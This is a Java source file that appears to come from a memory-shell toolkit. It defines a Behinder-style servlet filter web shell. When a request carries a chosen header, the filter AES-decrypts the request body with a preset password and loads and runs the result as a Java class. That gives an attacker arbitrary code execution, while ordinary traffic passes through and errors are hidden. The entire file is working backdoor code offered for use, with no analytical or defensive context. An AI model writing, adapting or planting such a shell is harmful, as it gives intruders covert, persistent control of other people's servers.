package jmg.behinder.memshell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;


public class BehinderFilter extends ClassLoader implements Filter {
    public String pass;
    public String headerName;
    public String headerValue;

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public BehinderFilter() {
    }

    public BehinderFilter(ClassLoader c) {
        super(c);
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;

        try {
            if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
                HttpSession session = ((HttpServletRequest) servletRequest).getSession();
                Map obj = new HashMap();
                obj.put("request", servletRequest);
                obj.put("response", response);
                obj.put("session", session);

                session.putValue("u", this.pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                (new BehinderFilter(this.getClass().getClassLoader())).g(c.doFinal(this.doBase64Decode(servletRequest.getReader().readLine()))).newInstance().equals(obj);
            } else {
                filterChain.doFilter(servletRequest, servletResponse);
            }
        } catch (Exception e) {
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }

    public byte[] doBase64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) ((byte[]) ((byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str)));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) ((byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str)));
        }
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void destroy() {
    }
}